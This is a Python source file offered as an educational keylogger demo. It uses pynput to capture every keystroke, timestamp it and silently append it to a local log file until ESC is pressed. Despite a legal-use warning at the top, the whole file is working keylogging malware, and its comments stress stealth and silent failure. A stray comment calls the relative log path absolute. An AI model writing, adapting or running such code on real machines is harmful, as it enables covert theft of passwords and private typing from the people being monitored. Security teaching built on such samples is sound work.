"""
Keylogger - Educational Demo
Team: Virus Distribution Center
SVIT Cyber Security Department

⚠️  WARNING: Use only on systems you own or have explicit written permission to monitor.
    Unauthorized use is illegal and punishable under CFAA / IT Act 2000.
"""

from pynput.keyboard import Key, Listener
from datetime import datetime

# ─── Configuration ──────────────────────────────────────────────
LOG_FILE = "keys.log"   # Absolute path — change as needed
# LOG_FILE = "keys.log"          # Use this for Windows / local testing

# ─── Special Key Map ────────────────────────────────────────────
SPECIAL_KEYS = {
    "Key.space":     "[SPACE]",
    "Key.enter":     "[ENTER]",
    "Key.backspace": "[BKSP]",
    "Key.tab":       "[TAB]",
    "Key.shift":     "[SHIFT]",
    "Key.ctrl_l":    "[CTRL]",
    "Key.ctrl_r":    "[CTRL]",
    "Key.alt_l":     "[ALT]",
    "Key.alt_r":     "[ALT]",
    "Key.caps_lock": "[CAPS]",
    "Key.delete":    "[DEL]",
    "Key.up":        "[UP]",
    "Key.down":      "[DOWN]",
    "Key.left":      "[LEFT]",
    "Key.right":     "[RIGHT]",
}

# ─── Keystroke Logger ───────────────────────────────────────────
def log_keystroke(key):
    """
    Captures each keypress event.
    - Converts raw key object to string
    - Maps special keys to readable labels
    - Prepends a timestamp to each entry
    - Appends silently to the log file
    """
    key_str = str(key).replace("'", "")
    key_str = SPECIAL_KEYS.get(key_str, key_str)
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    try:
        with open(LOG_FILE, "a") as log_file:
            log_file.write(f"[{timestamp}] {key_str}\n")
    except Exception:
        pass  # Silent fail — do not crash the listener

# ─── Exit Condition ─────────────────────────────────────────────
def on_release(key):
    """
    Stops the listener gracefully when ESC is pressed.
    Returning False signals pynput to halt the Listener.
    """
    if key == Key.esc:
        return False  # Stop the listener

# ─── Entry Point ────────────────────────────────────────────────
def start_logging():
    """
    Initializes and starts the keyboard listener.
    Runs as a blocking call until ESC is pressed.
    """
    with Listener(
        on_press=log_keystroke,
        on_release=on_release
    ) as listener:
        listener.join()

if __name__ == "__main__":
    # Silent start — no console output for stealth demo
    start_logging()